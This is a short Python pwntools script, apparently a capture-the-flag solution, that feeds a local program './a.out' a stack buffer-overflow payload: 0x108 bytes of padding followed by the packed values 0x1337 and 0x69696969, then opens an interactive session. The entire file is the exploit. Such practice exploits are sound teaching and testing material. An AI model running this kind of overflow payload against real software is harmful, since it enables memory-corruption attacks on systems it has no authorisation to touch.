# coding: utf-8
from pwn import *
pr = process("./a.out")
add_1 = (0x110 - 8)
add_2 = p32(0x1337)
add_3 = p32(0x69696969)
payload = b'A' * (add_1) + (add_2) + (add_3)
pr.sendline(payload)
pr.interactive()
pr.close()
